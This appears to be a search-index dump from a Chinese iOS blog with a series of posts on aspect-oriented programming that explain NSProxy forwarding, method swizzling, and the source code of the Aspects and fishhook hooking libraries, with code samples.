[{"categories":["iOS"],"content":" iOS AOP文章系列 前导知识： Mach-O文件结构分析 静态链接\u0026动态链接 OC方法\u0026OC类\u0026OC对象 方法查找和消息转发 AOP框架： Method Swizzling Fishhook Apsects NSProxy AOP ","date":"2021-03-30","objectID":"/posts/nsproxy-aop.html:0:0","tags":["iOS","AOP"],"title":"NSProxy AOP","uri":"/posts/nsproxy-aop.html"},{"categories":["iOS"],"content":"介绍 iOS 有一个原生的 AOP 方法，就是利用 NSProxy 代理类！，我们先看下官网介绍： Typically, a message to a proxy is forwarded to the real object or causes the proxy to load (or transform itself into) the real object. Subclasses of NSProxy can be used to implement transparent distributed messaging (for example, NSDistantObject) or for lazy instantiation of objects that are expensive to create. NSProxy implements the basic methods required of a root class, including those defined in the NSObjectProtocol protocol. However, as an abstract class it doesn’t provide an initialization method, and it raises an exception upon receiving any message it doesn’t respond to. A concrete subclass must therefore provide an initialization or creation method and override the forwardInvocation(_:) and methodSignatureForSelector: methods to handle messages that it doesn’t implement itself. 说明两点： NSProxy 本身就是用来做代理转发消息的 NSProxy 的子类必须通过 forwardInvocation 和 methodSignatureForselector 来创建方法 Note 还记得我们在方法查找和消息转发文章中最后讲的慢速消息转发过程吗？ NSProxy 的声明： NS_ROOT_CLASS @interface NSProxy \u003cNSObject\u003e { __ptrauth_objc_isa_pointer Class isa; } + (id)alloc; + (id)allocWithZone:(nullable NSZone *)zone NS_AUTOMATED_REFCOUNT_UNAVAILABLE; + (Class)class; - (void)forwardInvocation:(NSInvocation *)invocation; - (nullable NSMethodSignature *)methodSignatureForSelector:(SEL)sel NS_SWIFT_UNAVAILABLE(\"NSInvocation and related APIs not available\"); - (void)dealloc; - (void)finalize; @property (readonly, copy) NSString *description; @property (readonly, copy) NSString *debugDescription; + (BOOL)respondsToSelector:(SEL)aSelector; - (BOOL)allowsWeakReference API_UNAVAILABLE(macos, ios, watchos, tvos); - (BOOL)retainWeakReference API_UNAVAILABLE(macos, ios, watchos, tvos); // - (id)forwardingTargetForSelector:(SEL)aSelector; @end 包含 isa 指针，说明其本身就是一个对象。并且遵守 NSObjcet 协议，还存在 forwardInvocation 和 methodSignatureForSelector 方法。 ","date":"2021-03-30","objectID":"/posts/nsproxy-aop.html:1:0","tags":["iOS","AOP"],"title":"NSProxy AOP","uri":"/posts/nsproxy-aop.html"},{"categories":["iOS"],"content":"🌰 🌰 在目 新增一个 MyProxy 类继承 NSProxy，并在其中实现一个目标对象的代理引用，同时实现两个关键方法: // MyProxy.h @interface MyProxy : NSProxy { id _target; } + (id)proxyWithTarget:(id)target; @end // MyProxy.m @implementation MyProxy + (id)proxyWithTarget:(id)target { MyProxy *mp = [MyProxy alloc]; mp-\u003e_target = target; return mp; } - (NSMethodSignature *)methodSignatureForSelector:(SEL)sel { return [_target methodSignatureForSelector:sel]; } - (void)forwardInvocation:(NSInvocation *)invocation { if (invocation \u0026\u0026 [_target respondsToSelector:invocation.selector]) { NSString *sn = NSStringFromSelector(invocation.selector); NSLog(@\"do something before %@\", sn); [invocation invokeWithTarget:_target]; NSLog(@\"do something after %@\", sn); } } @end // main.m 中添加代码 // ==== NSProxy ==== Person *p = [MyProxy proxyWithTarget:[[Person alloc] init]]; [p sleep]; [p walk]; ","date":"2021-03-30","objectID":"/posts/nsproxy-aop.html:2:0","tags":["iOS","AOP"],"title":"NSProxy AOP","uri":"/posts/nsproxy-aop.html"},{"categories":["iOS"],"content":"原理 proxyWithTarget: 实现将一个对象引用到自实现的代理类中，在真正调用对象方法时，代理类没有方法定义，找不到对应的 IMP，就会进入消息转发流程，从而执行 forwardInvocation: ，而我们在 forwardInvocation: 中执行原方法前后加入额外逻辑实现 AOP。 这里不仅可以打印方法名和修改方法逻辑，因为 NSInvocation 中封装了方法的全部信息，因此还能够打印或修改入参及返回值。 ","date":"2021-03-30","objectID":"/posts/nsproxy-aop.html:3:0","tags":["iOS","AOP"],"title":"NSProxy AOP","uri":"/posts/nsproxy-aop.html"},{"categories":["iOS"],"content":" iOS AOP文章系列 前导知识： Mach-O文件结构分析 静态链接\u0026动态链接 OC方法\u0026OC类\u0026OC对象 方法查找和消息转发 AOP框架： Method Swizzling Fishhook Apsects NSProxy AOP ","date":"2021-03-29","objectID":"/posts/apsects.html:0:0","tags":["iOS","AOP"],"title":"Apsects","uri":"/posts/apsects.html"},{"categories":["iOS"],"content":"介绍 Think of Aspects as method swizzling on steroids. It allows you to add code to existing methods per class or per instance, whilst thinking of the insertion point e.g. before/instead/after. Aspects automatically deals with calling super and is easier to use than regular method swizzling. 从 Apsects 的介绍可以看到利用 swizzling 技术来达到为类方法或实例方法添加额外逻辑。且有 before / instead / after 三种场景。 还是从 Demo 到源码分析。 Tip 强烈建议先阅读 方法查找和消息转发 文章来理解 Runtime 动态消息发送机制。 ","date":"2021-03-29","objectID":"/posts/apsects.html:1:0","tags":["iOS","AOP"],"title":"Apsects","uri":"/posts/apsects.html"},{"categories":["iOS"],"content":"玩坏的🌰 继续用之前的 Demo，我们在 Method Swizzling文章 中曾经为 Person 类扩展了一个 eat 方法，我们稍微修改下，加个入参但不处理，我们希望通过使用 Apsects hook 这个函数来打印入参 food 并在函数执行完成后对 food 做出评价： // Person + swizzle.m @implementation Person (swizzle) - (void)eat:(NSString *)food { NSLog(@\"i am eating\"); } @end // main.m // ==== Apsects ==== Person *p = [[Person alloc] init]; // apsects 的 hook 接口 [p aspect_hookSelector:@selector(eat:) withOptions:AspectPositionAfter usingBlock:^(id\u003cAspectInfo\u003e aspectInfo) { NSLog(@\"%@\", aspectInfo.arguments[0]); NSLog(@\"so delicious!\"); } error:NULL]; [p eat:@\"Mapo Tofu\"]; ","date":"2021-03-29","objectID":"/posts/apsects.html:2:0","tags":["iOS","AOP"],"title":"Apsects","uri":"/posts/apsects.html"},{"categories":["iOS"],"content":"源码分析 ","date":"2021-03-29","objectID":"/posts/apsects.html:3:0","tags":["iOS","AOP"],"title":"Apsects","uri":"/posts/apsects.html"},{"categories":["iOS"],"content":"入口 /// Adds a block of code before/instead/after the current `selector` for a specific class. /// /// @param block Aspects replicates the type signature of the method being hooked. /// The first parameter will be `id\u003cAspectInfo\u003e`, followed by all parameters of the method. /// These parameters are optional and will be filled to match the block signature. /// You can even use an empty block, or one that simple gets `id\u003cAspectInfo\u003e`. /// /// @note Hooking static methods is not supported. /// @return A token which allows to later deregister the aspect. + (id\u003cAspectToken\u003e)aspect_hookSelector:(SEL)selector withOptions:(AspectOptions)options usingBlock:(id)block error:(NSError **)error { return aspect_add((id)self, selector, options, block, error); } /// @return A token which allows to later deregister the aspect. - (id\u003cAspectToken\u003e)aspect_hookSelector:(SEL)selector withOptions:(AspectOptions)options usingBlock:(id)block error:(NSError **)error { return aspect_add(self, selector, options, block, error); } 根据注释可知这里 usingBlock 是 hook 方法后要修改的逻辑，入参第一个id\u003cAspectInfo\u003e，第二个开始是原方法参数。返回 AspectToken 对象。 static id aspect_add(id self, SEL selector, AspectOptions options, id block, NSError **error) { NSCParameterAssert(self); NSCParameterAssert(selector); NSCParameterAssert(block); __block AspectIdentifier *identifier = nil; aspect_performLocked(^{ // 1. 判断 SEL 是否允许 hook if (aspect_isSelectorAllowedAndTrack(self, selector, options, error)) { // 2. AspectsContainer \u003c== addAspect:withOption: == AspectIdentifier， // 创建 AspectsContainer 结构 AspectsContainer *aspectContainer = aspect_getContainerForObject(self, selector); // 将信息整理成 AspectIdentifier 结构 identifier = [AspectIdentifier identifierWithSelector:selector object:self options:options block:block error:error]; if (identifier) { // 将 AspectIdentifier 加入 AspectsContainer [aspectContainer addAspect:identifier withOptions:options]; // Modify the class to allow message interception. // 3. 消息拦截 aspect_prepareClassAndHookSelector(self, selector, error); } } }); return identifier; } ","date":"2021-03-29","objectID":"/posts/apsects.html:3:1","tags":["iOS","AOP"],"title":"Apsects","uri":"/posts/apsects.html"},{"categories":["iOS"],"content":"1. 判断是否能 hook aspect_isSelectorAllowedAndTrack 源码不贴了，主要做黑名单和是否重复 hook 检查： SEL 不能为 retain、release、autorelease、forwardInvocation: AspectPositionBefore 场景，SEL 不能为 dealloc 对象或类中需要找到 SEL 检查子类和父类是否 hook 过目标方法 ","date":"2021-03-29","objectID":"/posts/apsects.html:3:2","tags":["iOS","AOP"],"title":"Apsects","uri":"/posts/apsects.html"},{"categories":["iOS"],"content":"2. 记录数据结构 这里主要说明两个数据结构 @interface AspectIdentifier : NSObject + (instancetype)identifierWithSelector:(SEL)selector object:(id)object options:(AspectOptions)options block:(id)block error:(NSError **)error; - (BOOL)invokeWithInfo:(id\u003cAspectInfo\u003e)info; @property (nonatomic, assign) SEL selector; @property (nonatomic, strong) id block; @property (nonatomic, strong) NSMethodSignature *blockSignature; @property (nonatomic, weak) id object; @property (nonatomic, assign) AspectOptions options; @end @interface AspectsContainer : NSObject - (void)addAspect:(AspectIdentifier *)aspect withOptions:(AspectOptions)injectPosition; - (BOOL)removeAspect:(id)aspect; - (BOOL)hasAspects; @property (atomic, copy) NSArray *beforeAspects; @property (atomic, copy) NSArray *insteadAspects; @property (atomic, copy) NSArray *afterAspects; @end AspectIdentifier：切面，包含切面的具体内容如方法签名、执行时机等 AspectsContainer： 切面容器，装载切面 ","date":"2021-03-29","objectID":"/posts/apsects.html:3:3","tags":["iOS","AOP"],"title":"Apsects","uri":"/posts/apsects.html"},{"categories":["iOS"],"content":"3. 消息拦截（核心） static void aspect_prepareClassAndHookSelector(NSObject *self, SEL selector, NSError **error) { NSCParameterAssert(selector); // a. 替换 forwardInvocation Class klass = aspect_hookClass(self, error); Method targetMethod = class_getInstanceMethod(klass, selector); IMP targetMethodIMP = method_getImplementation(targetMethod); // imp 不是 _objc_msgForward 则进行方法替换 if (!aspect_isMsgForwardIMP(targetMethodIMP)) { // Make a method alias for the existing method implementation, it not already copied. // b. 替换 _objc_msgForward const char *typeEncoding = method_getTypeEncoding(targetMethod); SEL aliasSelector = aspect_aliasForSelector(selector); if (![klass instancesRespondToSelector:aliasSelector]) { __unused BOOL addedAlias = class_addMethod(klass, aliasSelector, method_getImplementation(targetMethod), typeEncoding); } // We use forwardInvocation to hook in. class_replaceMethod(klass, selector, aspect_getMsgForwardIMP(self, selector), typeEncoding); } } a. 替换forwardInvocation static Class aspect_hookClass(NSObject *self, NSError **error) { Class statedClass = self.class; Class baseClass = object_getClass(self); NSString *className = NSStringFromClass(baseClass); ... // Default case. Create dynamic subclass. // 动态创建一个后缀为： 原类名的类 + _Apsects_ const char *subclassName = [className stringByAppendingString:AspectsSubclassSuffix].UTF8String; // 获取 isa Class subclass = objc_getClass(subclassName); if (subclass == nil) { // 动态创建subclass类 subclass = objc_allocateClassPair(baseClass, subclassName, 0); if (subclass == nil) { NSString *errrorDesc = [NSString stringWithFormat:@\"objc_allocateClassPair failed to allocate class %s.\", subclassName]; AspectError(AspectErrorFailedToAllocateClassPair, errrorDesc); return nil; } // swizzle forwardInvocation: aspect_swizzleForwardInvocation(subclass); // 修改实例对象方法和类方法为之前状态，保证行为一致不影响外界使用 aspect_hookedGetClass(subclass, statedClass); aspect_hookedGetClass(object_getClass(subclass), statedClass); // 注册subclass类 objc_registerClassPair(subclass); } // self.isa -\u003e subclass object_setClass(self, subclass); return subclass; } 这里进行了第一次 swizzling，替换 forwardInvocation ： static void aspect_swizzleForwardInvocation(Class klass) { // 将 forwardInvocation: 指向自实现的 __ASPECTS_ARE_BEING_CALLED__ IMP originalImplementation = class_replaceMethod(klass, @selector(forwardInvocation:), (IMP)__ASPECTS_ARE_BEING_CALLED__, \"v@:@\"); if (originalImplementation) { // 增加一个名为 __aspects_forwardInvocation: 的方法指向 forwardInvocation: 原实现 class_addMethod(klass, NSSelectorFromString(AspectsForwardInvocationSelectorName), originalImplementation, \"v@:@\"); } } 自实现的 __ASPECTS_ARE_BEING_CALLED__ 的主要功能就是匹配不同的执行时机，然后通过 aspect_invoke 宏定义去执行 block 中自定义的逻辑。 aspect_invoke 调用 - (BOOL)invokeWithInfo:(id\u003cAspectInfo\u003e)info，该方法通过前面记录的方法签名和参数执行 invoke 调用（[blockInvocation invokeWithTarget:self.block]） static void __ASPECTS_ARE_BEING_CALLED__(__unsafe_unretained NSObject *self, SEL selector, NSInvocation *invocation) { SEL originalSelector = invocation.selector; // SEL 新方法名: alias_原sel名， 这个 aliasSelector 在后边 SEL swizzle 中做交换用到的 SEL aliasSelector = aspect_aliasForSelector(invocation.selector); invocation.selector = aliasSelector; // 根据 aliasSelector 找到容器 AspectsContainer *objectContainer = objc_getAssociatedObject(self, aliasSelector); AspectsContainer *classContainer = aspect_getContainerForClass(object_getClass(self), aliasSelector); AspectInfo *info = [[AspectInfo alloc] initWithInstance:self invocation:invocation]; NSArray *aspectsToRemove = nil; // 根据不同时机调用 aspect_invoke // Before hooks. aspect_invoke(classContainer.beforeAspects, info); aspect_invoke(objectContainer.beforeAspects, info); // Instead hooks. ... // After hooks. ... // If no hooks are installed, call original implementation (usually to throw an exception) if (!respondsToAlias) { invocation.selector = originalSelector; SEL originalForwardInvocationSEL = NSSelectorFromString(AspectsForwardInvocationSelectorName); if ([self respondsToSelector:originalForwardInvocationSEL]) { ((void( *)(id, SEL, N","date":"2021-03-29","objectID":"/posts/apsects.html:3:4","tags":["iOS","AOP"],"title":"Apsects","uri":"/posts/apsects.html"},{"categories":["iOS"],"content":"总结 整个核心实现过程为： 创建 subclass，并处理与 self 指针和方法的关系。每次都创建 subclass 的目的是为单个实例对象实现了 hook 处理 ， 而不会影响到其他同类的实例对象 。 交换 __aspects_forwardInvocation:（subclass 中新加的方法） 和 forwardInvocation: 实现，forwardInvocation: 指向 apsects 定义的 __ASPECTS_ARE_BEING_CALLED_ 来 invoke 用户定义的 block。 交换 targetMethod 的 selector 和 aliasSelector（subclass中新加的方法）实现，selector 指向 _objc_msgForward，aliasSelector 指向 targetMethod 的 IMP。 替换前，调用函数进行消息发送的流程是：targetMethod_SEL -\u003e objc_msgSend -\u003e _objc_msgForward -\u003e forwardInvocation: -\u003e targetMethod_IMP 整个替换后，流程是：targetMethod_SEL -\u003e objc_msgForward -\u003e forwardInvocation: -\u003e ASPECTS_ARE_BEING_CALLED ","date":"2021-03-29","objectID":"/posts/apsects.html:4:0","tags":["iOS","AOP"],"title":"Apsects","uri":"/posts/apsects.html"},{"categories":["iOS"],"content":" iOS AOP文章系列 前导知识： Mach-O文件结构分析 静态链接\u0026动态链接 OC方法\u0026OC类\u0026OC对象 方法查找和消息转发 AOP框架： Method Swizzling Fishhook Apsects NSProxy AOP fishhook 是 facebook 开源的一款简单易用的动态 hook 框架。一起学习下其原理。 ","date":"2021-03-25","objectID":"/posts/fishhook.html:0:0","tags":["iOS","AOP"],"title":"Fishhook","uri":"/posts/fishhook.html"},{"categories":["iOS"],"content":"还是那个🌰 在 OC方法\u0026OC类\u0026OC对象 中讲元类的时候分配注册了一个 Student 类，并实现了 study 方法，but 学生表面学习，内心还是向往诗和远方，因此我们想通过 Fishhook 动态 Hook NSLog 系统函数来表达学生党的真实内心： // main.m void StudyFunction(id self, SEL _cmd) { NSLog(@\"i am studing\"); } // 定义函数指针用来保存原始函数 static void (*orig_nslog)(NSString * format,...); // 定义新函数扩展 NSLog void newNSLog(NSString * format,...) { format = [format stringByAppendingFormat:@\"\\tOS: i want to play!\"]; // 调用原始 NSLog orig_nslog(format); } int main(int argc, const char * argv[]) { @autoreleasepool { // === create class ==== // 为class pair分配内存 Class newClass = objc_allocateClassPair([Person class], \"Student\", 0); // 为新类添加方法 class_addMethod(newClass, @selector(study), (IMP)StudyFunction, \"v@:\"); // 注册类 objc_registerClassPair(newClass); // 创建实例对象 id s = [[newClass alloc] init]; // ==== fishhook ==== // 通过 rebind_symbols 接口实现函数重绑定到自实现函数上 rebind_symbols((struct rebinding[1]){\"NSLog\", newNSLog, (void *)\u0026orig_nslog}, 1); [s performSelector:@selector(study)]; } return 0; } Tip 需要在工程中集成 fishhook.h 和 fishhook.c 文件 Fishhook 的使用非常简单，实现一个新函数并通过 rebind_symbols 接口即可完成重绑定。而且我们注意到 struct rebinding 结构体是个数组，还支持多个函数的 hook。 ","date":"2021-03-25","objectID":"/posts/fishhook.html:1:0","tags":["iOS","AOP"],"title":"Fishhook","uri":"/posts/fishhook.html"},{"categories":["iOS"],"content":"源码分析 int rebind_symbols(struct rebinding rebindings[], size_t rebindings_nel) { // 1 int retval = prepend_rebindings(\u0026_rebindings_head, rebindings, rebindings_nel); if (retval \u003c 0) { return retval; } // If this was the first call, register callback for image additions (which is also invoked for // existing images, otherwise, just run on existing images if (!_rebindings_head-\u003enext) { // 2 _dyld_register_func_for_add_image(_rebind_symbols_for_image); } else { uint32_t c = _dyld_image_count(); // 3 for (uint32_t i = 0; i \u003c c; i++) { _rebind_symbols_for_image(_dyld_get_image_header(i), _dyld_get_image_vmaddr_slide(i)); } } return retval; } 我们将 rebind_symbols 分为三部分 ","date":"2021-03-25","objectID":"/posts/fishhook.html:2:0","tags":["iOS","AOP"],"title":"Fishhook","uri":"/posts/fishhook.html"},{"categories":["iOS"],"content":"prepend_rebindings struct rebinding { const char *name; void *replacement; void **replaced; }; struct rebindings_entry { struct rebinding *rebindings; size_t rebindings_nel; struct rebindings_entry *next; }; static struct rebindings_entry *_rebindings_head; static int prepend_rebindings(struct rebindings_entry **rebindings_head, struct rebinding rebindings[], size_t nel) { // 定义 rebindings_entry 节点 struct rebindings_entry *new_entry = (struct rebindings_entry *) malloc(sizeof(struct rebindings_entry)); if (!new_entry) { return -1; } // 将 rebindings 拷贝到节点中 new_entry-\u003erebindings = (struct rebinding *) malloc(sizeof(struct rebinding) * nel); if (!new_entry-\u003erebindings) { free(new_entry); return -1; } memcpy(new_entry-\u003erebindings, rebindings, sizeof(struct rebinding) * nel); new_entry-\u003erebindings_nel = nel; // 依次链接节点 new_entry-\u003enext = *rebindings_head; *rebindings_head = new_entry; return 0; } 这部分代码很简单，就是创建一个链表数据结构，将每次传入的 rebindings 加入链表。 ","date":"2021-03-25","objectID":"/posts/fishhook.html:2:1","tags":["iOS","AOP"],"title":"Fishhook","uri":"/posts/fishhook.html"},{"categories":["iOS"],"content":"_dyld_register_func_for_add_image 第一调用会进入 _dyld_register_func_for_add_image(_rebind_symbols_for_image) 逻辑， /* * The following functions allow you to install callbacks which will be called * by dyld whenever an image is loaded or unloaded. During a call to _dyld_register_func_for_add_image() * the callback func is called for every existing image. Later, it is called as each new image * is loaded and bound (but initializers not yet run). The callback registered with * _dyld_register_func_for_remove_image() is called after any terminators in an image are run * and before the image is un-memory-mapped. */ extern void _dyld_register_func_for_add_image(void (*func)(const struct mach_header* mh, intptr_t vmaddr_slide)) __OSX_AVAILABLE_STARTING(__MAC_10_1, __IPHONE_2_0); 根据注释，_dyld_register_func_for_add_image 主要作用是为镜像注册回调函数，当镜像加载并未初始化时调用回调函数。 这里判断为第一次调用会注册 _rebind_symbols_for_image 回调。否则为每个镜像执行 _rebind_symbols_for_image。 ","date":"2021-03-25","objectID":"/posts/fishhook.html:2:2","tags":["iOS","AOP"],"title":"Fishhook","uri":"/posts/fishhook.html"},{"categories":["iOS"],"content":"_rebind_symbols_for_image static void rebind_symbols_for_image(struct rebindings_entry *rebindings, const struct mach_header *header, intptr_t slide) { Dl_info info; if (dladdr(header, \u0026info) == 0) { return; } segment_command_t *cur_seg_cmd; segment_command_t *linkedit_segment = NULL; struct symtab_command* symtab_cmd = NULL; struct dysymtab_command* dysymtab_cmd = NULL; uintptr_t cur = (uintptr_t)header + sizeof(mach_header_t); // 遍历 Macho-O 的 Load Commands 来找到 __LINKEDIT、LC_SYMTAB、LC_DYSYMTAB 段 for (uint i = 0; i \u003c header-\u003encmds; i++, cur += cur_seg_cmd-\u003ecmdsize) { cur_seg_cmd = (segment_command_t *)cur; if (cur_seg_cmd-\u003ecmd == LC_SEGMENT_ARCH_DEPENDENT) { if (strcmp(cur_seg_cmd-\u003esegname, SEG_LINKEDIT) == 0) { linkedit_segment = cur_seg_cmd; } } else if (cur_seg_cmd-\u003ecmd == LC_SYMTAB) { symtab_cmd = (struct symtab_command*)cur_seg_cmd; } else if (cur_seg_cmd-\u003ecmd == LC_DYSYMTAB) { dysymtab_cmd = (struct dysymtab_command*)cur_seg_cmd; } } if (!symtab_cmd || !dysymtab_cmd || !linkedit_segment || !dysymtab_cmd-\u003enindirectsyms) { return; } // Find base symbol/string table addresses // 各段结构中存在相对文件的偏移，那我们找到当前镜像的基址，就可以计算内存中各段真实地址，这里选用 __LINKEDIT 段来做基址计算 // linkedit 内存真实地址 = ASLR 偏移 + linkedit 虚拟地址 // 基址 = linkedit 内存真实地址 - linkedit 文件偏移 uintptr_t linkedit_base = (uintptr_t)slide + linkedit_segment-\u003evmaddr - linkedit_segment-\u003efileoff; nlist_t *symtab = (nlist_t *)(linkedit_base + symtab_cmd-\u003esymoff); char *strtab = (char *)(linkedit_base + symtab_cmd-\u003estroff); // Get indirect symbol table (array of uint32_t indices into symbol table) uint32_t *indirect_symtab = (uint32_t *)(linkedit_base + dysymtab_cmd-\u003eindirectsymoff); cur = (uintptr_t)header + sizeof(mach_header_t); // 遍历 __DATA_CONST 和 __DATA 段找到 __got 和 __la_symbol_ptr 节，找到后进入 perform_rebinding_with_section 逻辑 for (uint i = 0; i \u003c header-\u003encmds; i++, cur += cur_seg_cmd-\u003ecmdsize) { cur_seg_cmd = (segment_command_t *)cur; if (cur_seg_cmd-\u003ecmd == LC_SEGMENT_ARCH_DEPENDENT) { if (strcmp(cur_seg_cmd-\u003esegname, SEG_DATA) != 0 \u0026\u0026 strcmp(cur_seg_cmd-\u003esegname, SEG_DATA_CONST) != 0) { continue; } for (uint j = 0; j \u003c cur_seg_cmd-\u003ensects; j++) { section_t *sect = (section_t *)(cur + sizeof(segment_command_t)) + j; if ((sect-\u003eflags \u0026 SECTION_TYPE) == S_LAZY_SYMBOL_POINTERS) { perform_rebinding_with_section(rebindings, sect, slide, symtab, strtab, indirect_symtab); } if ((sect-\u003eflags \u0026 SECTION_TYPE) == S_NON_LAZY_SYMBOL_POINTERS) { perform_rebinding_with_section(rebindings, sect, slide, symtab, strtab, indirect_symtab); } } } } } 上述源码第一处循环主要遍历下图红框中段找到 __LINKEDIT、LC_SYMTAB、LC_DYSYMTAB 第二处循环主要找 got 和 la_symbol_ptr 两个表 ","date":"2021-03-25","objectID":"/posts/fishhook.html:2:3","tags":["iOS","AOP"],"title":"Fishhook","uri":"/posts/fishhook.html"},{"categories":["iOS"],"content":"perform_rebinding_with_section static void perform_rebinding_with_section(struct rebindings_entry *rebindings, section_t *section, intptr_t slide, nlist_t *symtab, char *strtab, uint32_t *indirect_symtab) { const bool isDataConst = strcmp(section-\u003esegname, SEG_DATA_CONST) == 0; // 之前的动态链接文章讲到，reserved1 为 got 表对应于 indirect symbols 中 reserved1 起始的项 // 即 got[n] = inderect_symbols[n + reserved1] // 这里计算动态符号表中 got 表对应的起始位置元素 uint32_t *indirect_symbol_indices = indirect_symtab + section-\u003ereserved1; // 获取 Section64(__DATA_CONST,__got) 或 Section64(__DATA,__la_symbol_ptr) void **indirect_symbol_bindings = (void **)((uintptr_t)slide + section-\u003eaddr); vm_prot_t oldProtection = VM_PROT_READ; if (isDataConst) { oldProtection = get_protection(rebindings); mprotect(indirect_symbol_bindings, section-\u003esize, PROT_READ | PROT_WRITE); } for (uint i = 0; i \u003c section-\u003esize / sizeof(void *); i++) { // 动态符号表.index ==\u003e 符号表[index] uint32_t symtab_index = indirect_symbol_indices[i]; if (symtab_index == INDIRECT_SYMBOL_ABS || symtab_index == INDIRECT_SYMBOL_LOCAL || symtab_index == (INDIRECT_SYMBOL_LOCAL | INDIRECT_SYMBOL_ABS)) { continue; } // 符号表.index = 字符名偏移 ==\u003e 字符串表 + index uint32_t strtab_offset = symtab[symtab_index].n_un.n_strx; char *symbol_name = strtab + strtab_offset; bool symbol_name_longer_than_1 = symbol_name[0] \u0026\u0026 symbol_name[1]; struct rebindings_entry *cur = rebindings; // 遍历链表 while (cur) { for (uint j = 0; j \u003c cur-\u003erebindings_nel; j++) { // 匹配方法名 if (symbol_name_longer_than_1 \u0026\u0026 strcmp(\u0026symbol_name[1], cur-\u003erebindings[j].name) == 0) { if (cur-\u003erebindings[j].replaced != NULL \u0026\u0026 indirect_symbol_bindings[i] != cur-\u003erebindings[j].replacement) { // 记录原始跳转地址 *(cur-\u003erebindings[j].replaced) = indirect_symbol_bindings[i]; } // 将新实现的方法地址写在 indirect_symbol_bindings 中完成替换 indirect_symbol_bindings[i] = cur-\u003erebindings[j].replacement; goto symbol_loop; } } cur = cur-\u003enext; } symbol_loop:; } if (isDataConst) { int protection = 0; if (oldProtection \u0026 VM_PROT_READ) { protection |= PROT_READ; } if (oldProtection \u0026 VM_PROT_WRITE) { protection |= PROT_WRITE; } if (oldProtection \u0026 VM_PROT_EXECUTE) { protection |= PROT_EXEC; } mprotect(indirect_symbol_bindings, section-\u003esize, protection); } } ","date":"2021-03-25","objectID":"/posts/fishhook.html:2:4","tags":["iOS","AOP"],"title":"Fishhook","uri":"/posts/fishhook.html"},{"categories":["iOS"],"content":"总结 其实 fishhook 的逻辑就是已知符号（要 hook 的函数名）反推其在 _got / __la_symbol_ptr 表中的位置，然后将真实函数地址写入。而符号的查找过程在源码和注释中已经理的很清晰，通过官网的图能更直观的看出几个表结构的关联。 我们还能得出一个结论，只有具有符号和符号绑定过程的函数才能通过 fishhook 进行 hook，运行时符号绑定也是我们之前讲过的 PIC 技术。因此自定义的 C 函数是无法使用 fishhook 的。 ","date":"2021-03-25","objectID":"/posts/fishhook.html:3:0","tags":["iOS","AOP"],"title":"Fishhook","uri":"/posts/fishhook.html"},{"categories":["iOS"],"content":" iOS AOP文章系列 前导知识： Mach-O文件结构分析 静态链接\u0026动态链接 OC方法\u0026OC类\u0026OC对象 方法查找和消息转发 AOP框架： Method Swizzling Fishhook Apsects NSProxy AOP ","date":"2021-03-20","objectID":"/posts/method-swizzling.html:0:0","tags":["iOS","AOP"],"title":"Method Swizzling","uri":"/posts/method-swizzling.html"},{"categories":["iOS"],"content":"iOS AOP 接下来的文章我们正式进入 iOS AOP 的世界。 AOP 是一种面向切面编程，核心思想是在不修改源码情况下给程序添加功能的技术。 根据 OC 的 runtime 特性，我们先来介绍比较基础的一种实现方式 – Method Swizzling。 ","date":"2021-03-20","objectID":"/posts/method-swizzling.html:1:0","tags":["iOS","AOP"],"title":"Method Swizzling","uri":"/posts/method-swizzling.html"},{"categories":["iOS"],"content":"🌰 演示 我们依旧使用 前导知识文章 中的 Demo，先为 Person 添加一个 Category 类来扩展一个 eat 方法，毕竟干饭人除了睡还要吃，要不和咸鱼有什么区别，我们想在 人 睡前先 吃饱饭，该如何利用 Swizzling 实现呢？ // Person.m @implementation Person - (void)sleep { NSLog(@\"i am sleeping\"); } @end // Person+swizzle.m @implementation Person (swizzle) - (void)eat { NSLog(@\"i am eating\"); // 这里调用自身并不会导致递归调用 // 因为在 main 中交换了 eat 和 sleep 的 IMP，所以这里实际上调用的是 sleep [self eat]; } @end // main.m int main(int argc, const char * argv[]) { @autoreleasepool { Person *p = [[Person alloc] init]; // 交换 sleep 和 eat 的 IMP Method ori_Method = class_getInstanceMethod([Person class], @selector(sleep)); Method new_Method = class_getInstanceMethod([Person class], @selector(eat)); method_exchangeImplementations(ori_Method, new_Method); [p sleep]; } return 0; } 这里调用 Person 的 sleep 方法，交换后实际调用 Person+swizzle 的 eat 方法，先打印 “i am eating”，然后执行 sleep 方法打印 “i am sleeping”。 当然还有一些在 runtime 中的 API 也能实现类似效果： BOOL class_addMethod(Class cls, SEL name, IMP imp, const char *types) // 类中添加方法 IMP class_replaceMethod(Class cls, SEL name, IMP imp, const char *types) // 修改类方法 Method class_getInstanceMethod(Class aClass, SEL aSelector) // 获取类实力方法 IMP method_setImplementation(Class cls, method_t *m, IMP imp) // 设置方法 imp ","date":"2021-03-20","objectID":"/posts/method-swizzling.html:2:0","tags":["iOS","AOP"],"title":"Method Swizzling","uri":"/posts/method-swizzling.html"},{"categories":["iOS"],"content":"原理 原理非常简单，我们看下 method_exchangeImplementations 的核心实现一目了然 void method_exchangeImplementations(Method m1, Method m2) { ... IMP imp1 = m1-\u003eimp(false); IMP imp2 = m2-\u003eimp(false); SEL sel1 = m1-\u003ename(); SEL sel2 = m2-\u003ename(); m1-\u003esetImp(imp2); m2-\u003esetImp(imp1); ... } 就是在运行时，改变方法结构体 method_t 的底层实现 struct method_t { SEL name; // 运行时方法名 const char *types; // 方法类型编码 MethodListIMP imp; // 方法实现的指针 } 执行的操作图形化为 ","date":"2021-03-20","objectID":"/posts/method-swizzling.html:3:0","tags":["iOS","AOP"],"title":"Method Swizzling","uri":"/posts/method-swizzling.html"},{"categories":["iOS"],"content":"使用建议 +load Swizzling 在类的 +load 方法中完成。 因为 +load 方法会在类被添加到 OC 运行时执行，且只会被调用一次，保证了 Swizzling 方法的及时处理。 dispath_once Swizzling 在 dispatch_once 中完成。保证只执行一次。 prefix Swizzling 方法添加前缀，避免方法名称冲突。 invoke the original imp 不调用原始实现很可能会导致程序状态或逻辑异常。 ","date":"2021-03-20","objectID":"/posts/method-swizzling.html:4:0","tags":["iOS","AOP"],"title":"Method Swizzling","uri":"/posts/method-swizzling.html"},{"categories":["iOS"],"content":" iOS AOP文章系列 前导知识： Mach-O文件结构分析 静态链接\u0026动态链接 OC方法\u0026OC类\u0026OC对象 方法查找和消息转发 AOP框架： Method Swizzling Fishhook Apsects NSProxy AOP Tip 源码分析环境：objc4-818.2 根据之前的文章我们知道OC方法的本质就是调用 obj_msgSend，那么我们具体分析下 ObjC 下方法的查找和转发机制。 obj_msgSend 的实现在 obj-msg-rm64.s 中的汇编代码为： ENTRY _objc_msgSend 